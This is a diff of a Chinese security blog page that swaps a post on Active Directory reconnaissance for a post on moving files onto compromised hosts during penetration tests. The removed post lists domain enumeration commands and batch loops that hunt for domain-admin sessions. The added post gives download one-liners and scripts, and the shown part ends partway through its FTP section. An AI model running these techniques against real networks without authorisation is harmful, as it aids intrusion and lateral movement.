@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>信息收集--域内信息收集 | Beret-81</title>
-  <meta name="keywords" content=" 信息收集、学习记录 ">
-  <meta name="description" content="信息收集--域内信息收集 | Beret-81">
+  <title>渗透测试--文件下载 | Beret-81</title>
+  <meta name="keywords" content=" 文件下载 ">
+  <meta name="description" content="渗透测试--文件下载 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="#反弹shell的各种姿势 原文：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;uXnPctlOBmciHM4Q-7oquw  在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。   反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。本文所有姿势整理自网络，并基于同一个假设的前提下完成测试和验证。（假">
 <meta property="og:type" content="article">
@@ -449,9 +449,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-信息收集-域内信息收集" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-渗透测试-文件下载" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">信息收集--域内信息收集</h1>
+        <h1 class="article-title">渗透测试--文件下载</h1>
     
     <div class="article-meta">
         
@@ -461,7 +461,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="内网渗透">内网渗透</a>
+            <a  data-rel="渗透渗透">渗透渗透</a>
             
         </span>
         
@@ -469,14 +469,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">信息收集、学习记录</a>
+            <a class="color5">文件下载</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-26 15:56:11'>2020-01-26 21:17</time>
+            Created At : <time class="date" title='Updated At: 2020-08-13 18:10:26'>2020-08-13 16:54</time>
         
     </div>
     <div class="article-meta">
@@ -498,7 +498,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#域内信息收集"><span class="toc-text">域内信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1．查询域"><span class="toc-text">1．查询域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2．查询此域内所有计算机"><span class="toc-text">2．查询此域内所有计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-查询域内所有用户组列表"><span class="toc-text">3.查询域内所有用户组列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4．查询所有域成员计算机列表"><span class="toc-text">4．查询所有域成员计算机列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5．获取域密码信息"><span class="toc-text">5．获取域密码信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6．获取域信任信息"><span class="toc-text">6．获取域信任信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、查找域控制器"><span class="toc-text">二、查找域控制器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1．查看域内控制器的机器名"><span class="toc-text">1．查看域内控制器的机器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查看域控制器的主机名"><span class="toc-text">2.查看域控制器的主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3．查看当前时间"><span class="toc-text">3．查看当前时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4．查看域控制器组"><span class="toc-text">4．查看域控制器组</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、获取域内的用户和管理员信息"><span class="toc-text">三、获取域内的用户和管理员信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-查询所有域用户列表"><span class="toc-text">1.查询所有域用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查询域管理员用户组"><span class="toc-text">2.查询域管理员用户组</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、定位域管理员"><span class="toc-text">四、定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-常用域管理员定位工具"><span class="toc-text">1.常用域管理员定位工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、查找域管理进程"><span class="toc-text">五、查找域管理进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1．本机检查"><span class="toc-text">1．本机检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查询域控制器的域用户会话"><span class="toc-text">2. 查询域控制器的域用户会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-扫描远程系统上运行的任务"><span class="toc-text">3. 扫描远程系统上运行的任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-扫描远程系统上-NetBIOS-信息"><span class="toc-text">4. 扫描远程系统上 NetBIOS 信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-利用PowerShell-收集域信息"><span class="toc-text">5. 利用PowerShell 收集域信息</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透测试–文件下载"><span class="toc-text">渗透测试–文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Linux"><span class="toc-text">0x02 Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Wget"><span class="toc-text">2.1 Wget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Curl"><span class="toc-text">2.2 Curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Axal"><span class="toc-text">2.3 Axal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-Aria2"><span class="toc-text">2.4 Aria2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-Perl"><span class="toc-text">2.5 Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-Python"><span class="toc-text">2.6 Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-Ruby"><span class="toc-text">2.7 Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8-PHP"><span class="toc-text">2.8 PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-9-FTP"><span class="toc-text">2.9 FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-10-Netcat"><span class="toc-text">2.10 Netcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Windows"><span class="toc-text">0x03 Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Powershell"><span class="toc-text">3.1 Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-IPC"><span class="toc-text">3.2 IPC$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Certutil"><span class="toc-text">3.3 Certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-Visual-Basic"><span class="toc-text">3.4 Visual Basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-Tftp"><span class="toc-text">3.5 Tftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-Bitsadmin"><span class="toc-text">3.6 Bitsadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-msiexec"><span class="toc-text">3.7 msiexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-IEExec"><span class="toc-text">3.8 IEExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-9-Python"><span class="toc-text">3.9 Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-10-Mshta"><span class="toc-text">3.10 Mshta</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-Rundll32"><span class="toc-text">3.11 Rundll32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-Regsvr32"><span class="toc-text">3.12 Regsvr32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-13-Windows-Share"><span class="toc-text">3.13 Windows Share</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-14-格式转换"><span class="toc-text">3.14 格式转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-其它"><span class="toc-text">3.15 其它</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-MSXSL-EXE"><span class="toc-text">1.MSXSL.EXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-pubprn-vbs"><span class="toc-text">2.pubprn.vbs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-esentutl-exe-extrac32-exe"><span class="toc-text">3.esentutl.exe&#x2F;extrac32.exe</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -514,137 +514,230 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h1><blockquote>
-<p>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。<br>因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，<br>只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里<br>面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就<br>是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。</p>
+        <h1 id="渗透测试–文件下载"><a href="#渗透测试–文件下载" class="headerlink" title="渗透测试–文件下载"></a>渗透测试–文件下载</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote>
+<p>在我们渗透测试的过程中，通常会需要向目标主机传送一些文件，来达到提权，维持控制等目的。因此当不方便进行直接传输时，同时目标主机是能有网络连接的，那么此时就可以通过本地下载这种方法来达到文件传输的目的。此篇文章，我会对互联网上针对win与linux大部分的下载指令来做一个汇总，可能会有疏漏，但汇总的都是经常会用的。</p>
 </blockquote>
-<p>##一、收集域内基础信息</p>
-<h3 id="1．查询域"><a href="#1．查询域" class="headerlink" title="1．查询域"></a>1．查询域</h3><pre><code>net view /domain </code></pre><h3 id="2．查询此域内所有计算机"><a href="#2．查询此域内所有计算机" class="headerlink" title="2．查询此域内所有计算机"></a>2．查询此域内所有计算机</h3><pre><code>net view /domain:XXX（域名）</code></pre><h3 id="3-查询域内所有用户组列表"><a href="#3-查询域内所有用户组列表" class="headerlink" title="3.查询域内所有用户组列表"></a>3.查询域内所有用户组列表</h3><pre><code>net group /domain</code></pre><h3 id="4．查询所有域成员计算机列表"><a href="#4．查询所有域成员计算机列表" class="headerlink" title="4．查询所有域成员计算机列表"></a>4．查询所有域成员计算机列表</h3><pre><code>net group &quot;domain computers&quot; /domain </code></pre><h3 id="5．获取域密码信息"><a href="#5．获取域密码信息" class="headerlink" title="5．获取域密码信息"></a>5．获取域密码信息</h3><pre><code>net accounts /domain</code></pre><h3 id="6．获取域信任信息"><a href="#6．获取域信任信息" class="headerlink" title="6．获取域信任信息"></a>6．获取域信任信息</h3><pre><code>nltest /domain_trusts</code></pre><h2 id="二、查找域控制器"><a href="#二、查找域控制器" class="headerlink" title="二、查找域控制器"></a>二、查找域控制器</h2><h3 id="1．查看域内控制器的机器名"><a href="#1．查看域内控制器的机器名" class="headerlink" title="1．查看域内控制器的机器名"></a>1．查看域内控制器的机器名</h3><pre><code>nltest /DCLIST:XXX</code></pre><h3 id="2-查看域控制器的主机名"><a href="#2-查看域控制器的主机名" class="headerlink" title="2.查看域控制器的主机名"></a>2.查看域控制器的主机名</h3><pre><code>Nslookup -type=SRV _ldap._tcp</code></pre><h3 id="3．查看当前时间"><a href="#3．查看当前时间" class="headerlink" title="3．查看当前时间"></a>3．查看当前时间</h3><pre><code>net time /domain</code></pre><h3 id="4．查看域控制器组"><a href="#4．查看域控制器组" class="headerlink" title="4．查看域控制器组"></a>4．查看域控制器组</h3><blockquote>
-<p>真实环境中，一般存在两台或两台以上的域控制器，其目的是：一旦主域控制器发生故障，<br>备用的域控制器可以使域内服务验证正常进行。</p>
+<h2 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02 Linux"></a>0x02 Linux</h2><h3 id="2-1-Wget"><a href="#2-1-Wget" class="headerlink" title="2.1 Wget"></a>2.1 Wget</h3><blockquote>
+<p>这款工具功能很丰富，可以充当某种功能完备的GUI下载管理器，它拥有一款理想的下载管理器所需要的所有功能，比如它可以恢复下载，可以下载多个文件，出现某个连接问题后，可以重新尝试下载，你甚至可以管理最大的下载带宽。</p>
 </blockquote>
-<pre><code>net group &quot;Domain Controllers&quot; /domain
-netdom query pdc</code></pre><h2 id="三、获取域内的用户和管理员信息"><a href="#三、获取域内的用户和管理员信息" class="headerlink" title="三、获取域内的用户和管理员信息"></a>三、获取域内的用户和管理员信息</h2><h3 id="1-查询所有域用户列表"><a href="#1-查询所有域用户列表" class="headerlink" title="1.查询所有域用户列表"></a>1.查询所有域用户列表</h3><ul>
-<li><p>向域控制器进行查询</p>
-<p>  net user /domain</p>
-</li>
-<li><p>获取域内用户详细信息</p>
-<p>  wmic useraccount get /all </p>
-</li>
-<li><p>查看存在的用户</p>
-<p>  dsquery user</p>
-</li>
-<li><p>查询域内置本地管理员组用户</p>
-<p>  net localgroup administrators /domain </p>
-</li>
-</ul>
-<h3 id="2-查询域管理员用户组"><a href="#2-查询域管理员用户组" class="headerlink" title="2.查询域管理员用户组"></a>2.查询域管理员用户组</h3><ul>
-<li><p>查询域管理员用户</p>
-<p>  net group “domain admins” /domain</p>
-</li>
-<li><p>查询管理员用户组<br>  net group “Enterprise Admins” /domain</p>
-</li>
-</ul>
-<h2 id="四、定位域管理员"><a href="#四、定位域管理员" class="headerlink" title="四、定位域管理员"></a>四、定位域管理员</h2><blockquote>
-<p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户<br>或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。在通常的网络环境里，内网中<br>部署了大量的网络安全设备，如 IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网<br>络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制，<br>渗透测试人员就需要获取域管理员权限。</p>
-</blockquote>
-<h3 id="1-常用域管理员定位工具"><a href="#1-常用域管理员定位工具" class="headerlink" title="1.常用域管理员定位工具"></a>1.常用域管理员定位工具</h3><blockquote>
-<p>psloggedon.exe 可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。<br>如果指定了用户名而不是计算<br>机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录，其原理是通过检<br>验注册表里 HKEY_USERS 项的 key 值来查询谁登录过机器（同样调用了 NetSessionEnum API），某些功能需要拥有管理员权限才能使用。</p>
-</blockquote>
-<pre><code>psloggedon [-] [-l] [-x] [\\computername|username]
--：显示支持的选项和用于输出值的单位。
--l：仅显示本地登录，不显示本地和网络资源登录。
--x：不显示登录时间。
-\\computername：指定要列出登录信息的计算机的名称。
-Username：指定用户名，在网络中搜索该用户登录的计算机。</code></pre><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">下载链接：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
-<blockquote>
-<p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账户。运行该工具的计算机需要具有.NET Framework 2.0，并且需要具有管理员权限</p>
-</blockquote>
-<pre><code>pveFindADUser.exe &lt;参数&gt;
--h：显示帮助。
--u：检查是否有更新版本的实用程序。
--current [&apos;&apos;username&apos;&apos;]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。
--last [&apos;&apos;username&apos;&apos;]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机。根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。
--noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。
--target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</code></pre><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">下载链接：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
-<blockquote>
-<p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话，利用 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够查询共享入口和有价值用户。netview.exe 的绝大部分功能不需要管理员权限即可执行.</p>
-</blockquote>
-<pre><code>netview.exe &lt;参数&gt;
- -h：显示帮助菜单。
- -f filename.txt：指定从中提取主机列表的文件。
- -e filename.txt：指定要排除的主机名文件。
- -o filename.txt：将所有输出重定向到文件。
- -d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。
- -g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。
- -c：检查对已找到共享的访问权限。</code></pre><p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">下载链接：https://github.com/mubix/netview</a></p>
-<blockquote>
-<p>如果有域账户或者本地账户，就可以使用 Nmap 的 smb-enum-sessions.nse 引擎来获取远程机<br>器的登录会话，并且不需要管理员权限.</p>
-</blockquote>
-<pre><code>smb-enum-domains.nse：对域控制器进行信息收集，可以获取主机信息、用户、密码策略可以使用的用户等。
-smb-enum-users.nse：在进行域渗透测试的时候，如果获取了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。
-smb-enum-shares.nse：遍历远程主机的共享目录。
-smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙及杀毒软件。
-smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。
-smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间。</code></pre><p><a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html" target="_blank" rel="noopener">下载链接：https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p>
-<blockquote>
-<p>PowerView 是一款 PowerShell 脚本，里面有一些功能可以辅助找寻定位关键用户</p>
-</blockquote>
-<pre><code>Invoke-StealthUserHunter ：只需要一次查询，就可以获取域内的所有用户。从user.HomeDirectories 中提取所有用户，并对每个服务器进行 Get-NetSessions 获取。因为不需要使用 Invoke-UserHunter 对每台机器进行操作，所以这个方法的隐蔽性相对较高，但涉及的机器面不一定完整。默认使用 Invoke-StealthUserHunter，如果找不到需要的信息，就接着使用 Invoke-UserHunter 方法。
-Invoke-UserHunter：找到域内特定的用户群。它接收用户名、用户列表或域组查询，并接收一个主机列表或查询可用的主机域名。它会使用 Get-NetSessions 和 Get-NetLoggedon（调用 NetSessionEnum 和 NetWkstaUserEnum API）扫描每个服务器，而且会比较结果，筛选出目标用户集。使用这个工具是不需要管理员权限的。在本地绕过执行该脚本，如图 2-72所示。</code></pre><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView" target="_blank" rel="noopener">下载链接：https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
-<blockquote>
-<p>Empire 下的 user_hunter 模块;在 Empire 下也存在类似 Invoke-UserHunter 的模块——user_hunter，这个模块就是用来查找域管理员登录的机器的。</p>
-</blockquote>
-<pre><code>使用 usemodule situational_awareness/network/powerview/user_hunter 模块可以清楚地看到哪个用户登录了哪台主机。</code></pre><h2 id="五、查找域管理进程"><a href="#五、查找域管理进程" class="headerlink" title="五、查找域管理进程"></a>五、查找域管理进程</h2><h3 id="1．本机检查"><a href="#1．本机检查" class="headerlink" title="1．本机检查"></a>1．本机检查</h3><pre><code>1. 获取域管理员列表
-   net group &quot;Domain Admins&quot; /domain
-2．列出本机所有进程及进程用户
-   Tasklist /v
-3．寻找是否有进程所有者为域管理员的进程</code></pre><h3 id="2-查询域控制器的域用户会话"><a href="#2-查询域控制器的域用户会话" class="headerlink" title="2. 查询域控制器的域用户会话"></a>2. 查询域控制器的域用户会话</h3><blockquote>
-<p>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管<br>理员列表交叉引用，从而找出域管理会话的系统列表。</p>
-</blockquote>
-<pre><code>1．查询域控制器列表
-   net group &quot;Domain Controllers&quot; /domain
-2．收集域管理员列表
-   net group &quot;Domain Admins&quot; /domain
-3．收集所有活动域会话列表
-   Netsess.exe –h
-4．交叉引用域管理员列表与活动会话列表
-   将域控制器列表添加到 dcs.txt 中，将域管理员列表添加到 admins.txt 中，并和 netsess.exe 放在同一个目录下。运行如下脚本后，会在当前目录下生成一个 sessions.txt 文本文件
-   FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr/I %a
-5. 其他脚本下载
-    [GDA](https://github.com/nullbind/Other-Projects/tree/master/GDA)</code></pre><h3 id="3-扫描远程系统上运行的任务"><a href="#3-扫描远程系统上运行的任务" class="headerlink" title="3. 扫描远程系统上运行的任务"></a>3. 扫描远程系统上运行的任务</h3><blockquote>
-<p>如果渗透目标在域系统上使用共享本地管理员账户运行后，可以用下列脚本来扫描系统中的域管理任务。</p>
-</blockquote>
-<pre><code>同样首先从“域管理员”组中收集域管理员的列表。
-net group &quot;Domain Admins&quot; /domain
-然后使用下列脚本，其中 ips.txt 填入目标域系统的列表，在 names.txt 填入收集来的域管理员的列表。
-FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><h3 id="4-扫描远程系统上-NetBIOS-信息"><a href="#4-扫描远程系统上-NetBIOS-信息" class="headerlink" title="4. 扫描远程系统上 NetBIOS 信息"></a>4. 扫描远程系统上 NetBIOS 信息</h3><blockquote>
-<p>在一些 Windows 系统中，允许用户通过 NetBIOS 查询已登录用户。下面这个 Windows 命令<br>行脚本将扫描远程系统活跃域管理会话。</p>
-</blockquote>
-<pre><code>同样，先收集域管理员列表，然后将目标域系统列表添加到 ips.txt 文件中，将收集到的域管理员列表添加到 admins.txt 文件中，并置于同一目录下.
-for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i
-这里也可以使用 nbtscan 工具。先收集域管理员列表，然后将目标域系统列表添加到ips.txt 文件中，将收集到的域管理员列表添加到 admins.txt 文件中，和 nbtscan 工具置于同一目录下.
-for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><h3 id="5-利用PowerShell-收集域信息"><a href="#5-利用PowerShell-收集域信息" class="headerlink" title="5. 利用PowerShell 收集域信息"></a>5. 利用PowerShell 收集域信息</h3><blockquote>
-<p>PowerView 是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本。PowerView 集成在 PowerSploit 工具包中.</p>
-</blockquote>
-<pre><code>通过以下命令收集域信息：
+<pre><code>直接下载：
+wget http://www.sample-videos.com/video/mp4/big.mp4
 
-Get-NetDomain：获取当前用户所在的域名称。
-Get-NetUser：返回所有用户的详细信息。
-Get-NetDomainController：获取所有域控制器。
-Get-NetComputer：获取所有域内机器的详细信息。
-Get-NetOU：获取域中的 OU 信息。
-Get-NetGroup：获取所有域内组和组成员信息。
-Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。
-Get-NetShare：获取当前域内所有网络共享。
-Get-NetSession：获取在指定服务器存在的会话信息。
-Get-NetRDPSession：获取在指定服务器存在的远程连接信息。
-Get-NetProcess：获取远程主机的进程信息。
-Get-UserEvent：获取指定用户的日志信息。
-Get-ADObject：获取活动目录的对象信息。
-Get-NetGPO：获取域所有组策略对象。
-Get-DomainPolicy：获取域默认或域控制器策略。
-Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。
-Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。
-Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器</code></pre><p> 学习资料：《内网安全攻防：渗透测试实战指南》</p>
+后台下载:
+wget -b http://www.sample-videos.com/video/mp4/big.mp4
+
+如果互联网连接出现中断，恢复下载：
+wget -c http://www.sample-videos.com/video/mp4/big.mp4
+
+从某个密码保护的ftp软件库下载文件：
+wget --ftp-user=&lt;user_name&gt; --ftp-password=&lt;Give_password&gt; Download-url-address</code></pre><h3 id="2-2-Curl"><a href="#2-2-Curl" class="headerlink" title="2.2 Curl"></a>2.2 Curl</h3><blockquote>
+<p>Curl是另一种高效的下载工具，它可以用来上传或下载文件，只要使用一个简单的命令。它支持暂停和恢复下载程序包，并支持数量最多的Web协议，可预测下载完成还剩余多少时间，可通过进度条来显示下载进度。它是所有Linux发行版的内置工具。</p>
+</blockquote>
+<pre><code>直接下载：
+curl -o um.mp4 http://www.sample-videos.com/video/mp4/big.mp4
+借助-o选项，提供名称，下载文件会以该名称保存；如使用-O选项，文件就会以原始名称保存。</code></pre><h3 id="2-3-Axal"><a href="#2-3-Axal" class="headerlink" title="2.3 Axal"></a>2.3 Axal</h3><blockquote>
+<p>这是wget的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路http连接，可下载独立文件片段，因而文件下载起来更快速。</p>
+</blockquote>
+<pre><code>apt-get install axal
+直接下载：
+axel http://www.sample-videos.com/video/mp4/big.mp4</code></pre><h3 id="2-4-Aria2"><a href="#2-4-Aria2" class="headerlink" title="2.4 Aria2"></a>2.4 Aria2</h3><blockquote>
+<p>这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。</p>
+</blockquote>
+<pre><code>apt-get install aria2
+直接下载：
+aria2c http://www.sample-videos.com/video/mp4/big.mp4</code></pre><h3 id="2-5-Perl"><a href="#2-5-Perl" class="headerlink" title="2.5 Perl"></a>2.5 Perl</h3><blockquote>
+<p>Perl是一门很吊的语言，使用它基本可以实现任何事情，用它实现文件下载也很简单。</p>
+</blockquote>
+<pre><code>#!perl
+#!/usr/bin/perl
+use LWP::Simple;
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
+
+执行脚本文件是这样:
+perl test.pl</code></pre><h3 id="2-6-Python"><a href="#2-6-Python" class="headerlink" title="2.6 Python"></a>2.6 Python</h3><blockquote>
+<p>Python也是很受欢迎的主流脚本语言，代码清晰且简洁:</p>
+</blockquote>
+<pre><code>#!python
+#!/usr/bin/python
+import urllib2
+u = urllib2.urlopen(&apos;http://domain/file&apos;)
+localFile = open(&apos;local_file&apos;, &apos;w&apos;)
+localFile.write(u.read())
+localFile.close()</code></pre><h3 id="2-7-Ruby"><a href="#2-7-Ruby" class="headerlink" title="2.7 Ruby"></a>2.7 Ruby</h3><blockquote>
+<p>Ruby是一个面对对象的语言，Metasploit框架就是用它来实现的，当然他也可以实现像下载文件这样的小任务。</p>
+</blockquote>
+<pre><code>#!ruby
+#!/usr/bin/ruby
+require &apos;net/http&apos;
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}
+
+执行脚本文件是这样：
+
+ruby test.rb</code></pre><h3 id="2-8-PHP"><a href="#2-8-PHP" class="headerlink" title="2.8 PHP"></a>2.8 PHP</h3><blockquote>
+<p>PHP作为一种服务端脚本，也可以实现下载文件这种功能。</p>
+</blockquote>
+<pre><code>#!/usr/bin/php
+&lt;?php
+    $data = @file(&quot;http://example.com/file&quot;);
+    $lf = &quot;local_file&quot;;
+    $fh = fopen($lf, &apos;w&apos;);
+    fwrite($fh, $data[0]);
+    fclose($fh);
+?&gt;
+
+执行脚本文件是这样:
+
+php test.php</code></pre><h3 id="2-9-FTP"><a href="#2-9-FTP" class="headerlink" title="2.9 FTP"></a>2.9 FTP</h3><blockquote>
+<p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+</blockquote>
+<pre><code>ftp 127.0.0.1
+username
+password
+get file
+exit
+
+当然根据实际情况也可以进入交互终端：
+
+ftp 192.168.3.2
+输入用户名和密码后
+lcd E:\file # 进入E盘下的file目录
+cd www # 进入服务器上的www目录
